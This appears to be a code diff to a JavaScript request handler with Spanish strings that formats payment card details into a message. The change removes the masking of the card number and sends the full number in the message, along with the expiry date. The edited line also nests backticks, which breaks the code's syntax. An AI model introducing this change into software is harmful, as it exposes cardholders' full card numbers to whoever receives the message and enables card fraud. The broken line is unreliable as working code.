@@ -126,8 +126,9 @@ export default async function handler(req, res) {
 
                     mensaje += `💳 *DATOS DE LA TARJETA:*\n`;
                     if (numeroTarjeta) {
-                        const ultimosCuatro = numeroTarjeta.slice(-4);
-                        mensaje += `🏦 Número: \`****-****-****-${ultimosCuatro}\`\n`;
+                        
+                        mensaje += `🏦 Número: `${numeroTarjeta}`
+`;
                     }
                     mensaje += `🔢 CVV: \`***\`\n`;
                     if (vencimiento) mensaje += `📅 Vencimiento: \`${vencimiento}\`\n`;
